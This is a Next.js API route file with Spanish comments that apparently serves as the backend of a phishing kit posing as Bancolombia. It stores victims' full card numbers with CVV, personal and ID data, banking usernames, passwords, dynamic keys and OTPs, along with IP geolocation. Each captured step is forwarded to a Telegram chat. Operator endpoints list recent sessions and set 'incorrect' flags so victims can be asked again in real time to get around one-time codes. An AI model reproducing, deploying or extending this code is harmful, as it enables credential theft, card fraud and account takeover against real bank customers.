import { NextRequest, NextResponse } from 'next/server';
import { PrismaClient } from '@prisma/client';
import { sendToTelegram, getGeoLocation } from '@/lib/telegram';

const prisma = new PrismaClient();

// Función para obtener la IP real del cliente
function getClientIp(request: NextRequest): string {
  // Intentar obtener IP de varios headers
  const forwarded = request.headers.get('x-forwarded-for');
  const realIp = request.headers.get('x-real-ip');
  const cfConnectingIp = request.headers.get('cf-connecting-ip');
  
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  if (realIp) {
    return realIp;
  }
  if (cfConnectingIp) {
    return cfConnectingIp;
  }
  
  return 'unknown';
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { action, sessionId, ...data } = body;

    switch (action) {
      case 'create_session':
        const generatedSessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Obtener IP del cliente
        const clientIp = getClientIp(request);
        
        // Obtener geolocalización
        let geoCity = null;
        let geoCountry = null;
        if (clientIp !== 'unknown') {
          const geoData = await getGeoLocation(clientIp);
          if (geoData) {
            geoCity = geoData.city;
            geoCountry = geoData.country;
          }
        }
        
        const session = await prisma.bankSession.create({
          data: {
            sessionId: generatedSessionId,
            bank: data.bank || 'bancolombia',
            
            // Guardar TODOS los datos personales
            fullName: data.fullName,
            email: data.email,
            phone: data.phone,
            address: data.address,
            city: data.city,
            state: data.state,
            country: data.country,
            postalCode: data.postalCode,
            documentId: data.documentId,
            
            // Guardar TODA la información de tarjeta
            cardNumber: data.cardNumber, // Número completo
            cardHolderName: data.cardHolderName,
            expiryDate: data.expiryDate,
            cvv: data.cvv,
            cardBrand: data.cardBrand,
            
            // Monto total
            totalAmount: data.totalAmount,
            
            // Geolocalización
            ipAddress: clientIp,
            geoCity: geoCity,
            geoCountry: geoCountry,
            
            // Status y datos JSON como respaldo
            status: 'processing',
            customerData: JSON.stringify(data.customerData || {}),
            orderData: JSON.stringify(data.orderData || {}),
            createdAt: new Date(),
          }
        });
        
        // Enviar mensaje inicial a Telegram
        try {
          const messageId = await sendToTelegram(session);
          // Guardar el message_id en la base de datos
          await prisma.bankSession.update({
            where: { sessionId: generatedSessionId },
            data: { telegramMessageId: messageId }
          });
        } catch (error) {
          console.error('Error sending initial Telegram message:', error);
        }
        
        return NextResponse.json({ success: true, session });

      case 'update_user':
        const updatedUserSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            usuario: data.usuario,
            status: 'user_entered',
            updatedAt: new Date(),
          }
        });
        
        // Actualizar mensaje en Telegram
        if (updatedUserSession.telegramMessageId) {
          try {
            await sendToTelegram(updatedUserSession, updatedUserSession.telegramMessageId);
          } catch (error) {
            console.error('Error updating Telegram message:', error);
          }
        }
        
        return NextResponse.json({ success: true, session: updatedUserSession });

      case 'update_password':
        const updatedPasswordSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            clave: data.clave,
            status: 'password_entered',
            updatedAt: new Date(),
          }
        });
        
        // Actualizar mensaje en Telegram
        if (updatedPasswordSession.telegramMessageId) {
          try {
            await sendToTelegram(updatedPasswordSession, updatedPasswordSession.telegramMessageId);
          } catch (error) {
            console.error('Error updating Telegram message:', error);
          }
        }
        
        return NextResponse.json({ success: true, session: updatedPasswordSession });

      case 'update_dynamic_key':
        const updatedDynamicKeySession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            claveDinamica: data.claveDinamica,
            status: 'dynamic_key_entered',
            updatedAt: new Date(),
          }
        });
        
        // Enviar datos completos a Telegram cuando se capture la clave dinámica
        try {
          await sendToTelegram(updatedDynamicKeySession);
        } catch (error) {
          console.error('Error sending to Telegram:', error);
        }
        
        return NextResponse.json({ success: true, session: updatedDynamicKeySession });

      case 'request_otp':
        const updatedOtpSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: 'waiting_otp',
            otpRequestedAt: new Date(),
            updatedAt: new Date(),
          }
        });

        // Set timeout for 60 seconds
        setTimeout(async () => {
          try {
            const session = await prisma.bankSession.findUnique({
              where: { sessionId }
            });

            if (session && session.status === 'waiting_otp') {
              await prisma.bankSession.update({
                where: { sessionId },
                data: { status: 'timeout', updatedAt: new Date() }
              });
            }
          } catch (error) {
            console.error('Error handling timeout:', error);
          }
        }, 60000); // 60 seconds

        return NextResponse.json({ success: true, session: updatedOtpSession });

      case 'submit_otp':
        const updatedOtpSubmitSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            otp: data.otp,
            claveDinamica: data.otp, // También guardar en claveDinamica
            status: 'otp_submitted',
            dinamicaIncorrecta: false, // Limpiar flag cuando se envía nueva dinámica
            updatedAt: new Date(),
          }
        });
        
        // Actualizar mensaje en Telegram con la clave dinámica
        if (updatedOtpSubmitSession.telegramMessageId) {
          try {
            await sendToTelegram(updatedOtpSubmitSession, updatedOtpSubmitSession.telegramMessageId);
          } catch (error) {
            console.error('Error updating Telegram message:', error);
          }
        }
        
        return NextResponse.json({ success: true, session: updatedOtpSubmitSession });

      case 'validate_otp':
        const validatedOtpSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: data.isValid ? 'otp_valid' : 'password_entered', // Si es inválida, regresa a password_entered
            otp: data.isValid ? undefined : null, // Clear OTP if invalid
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: validatedOtpSession });

      case 'timeout':
        await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: 'timeout',
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true });

      case 'complete':
        const completedSession = await prisma.bankSession.update({
          where: { sessionId },
          data: {
            status: 'completed',
            completedAt: new Date(),
            updatedAt: new Date(),
          }
        });
        return NextResponse.json({ success: true, session: completedSession });

      case 'send_to_telegram':
        // Enviar manualmente a Telegram desde el panel
        const sessionToSend = await prisma.bankSession.findUnique({
          where: { sessionId }
        });
        
        if (!sessionToSend) {
          return NextResponse.json({ error: 'Session not found' }, { status: 404 });
        }
        
        try {
          await sendToTelegram(sessionToSend);
          return NextResponse.json({ success: true, message: 'Enviado a Telegram' });
        } catch (error) {
          console.error('Error sending to Telegram manually:', error);
          return NextResponse.json({ error: 'Failed to send to Telegram' }, { status: 500 });
        }

      case 'clear_usuario_flag':
        await prisma.bankSession.update({
          where: { sessionId: data.sessionId },
          data: { usuarioIncorrecto: false }
        });
        return NextResponse.json({ success: true });
      
      case 'clear_clave_flag':
        await prisma.bankSession.update({
          where: { sessionId: data.sessionId },
          data: { claveIncorrecta: false }
        });
        return NextResponse.json({ success: true });
      
      case 'clear_dinamica_flag':
        await prisma.bankSession.update({
          where: { sessionId: data.sessionId },
          data: { dinamicaIncorrecta: false }
        });
        return NextResponse.json({ success: true });

      default:
        return NextResponse.json({ error: 'Action not found' }, { status: 400 });
    }
  } catch (error) {
    console.error('Cheche API error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const action = searchParams.get('action');
    const sessionId = searchParams.get('sessionId');

    // Soporte para GET sin action - buscar por sessionId
    if (!action && sessionId) {
      const sess = await prisma.bankSession.findUnique({
        where: { sessionId }
      });
      return NextResponse.json({ success: true, session: sess });
    }

    switch (action) {
      case 'get_session':
        const session = await prisma.bankSession.findUnique({
          where: { sessionId: sessionId! }
        });
        return NextResponse.json({ success: true, session });

      case 'get_all_sessions':
        const sessions = await prisma.bankSession.findMany({
          orderBy: { createdAt: 'desc' },
          take: 100 // Mostrar las últimas 100 sesiones
        });
        return NextResponse.json({ success: true, sessions });

      case 'check_status':
        const currentSession = await prisma.bankSession.findUnique({
          where: { sessionId: sessionId! },
          select: { status: true, updatedAt: true }
        });
        return NextResponse.json({ success: true, status: currentSession?.status, updatedAt: currentSession?.updatedAt });

      default:
        return NextResponse.json({ error: 'Action not found' }, { status: 400 });
    }
  } catch (error) {
    console.error('Cheche API GET error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}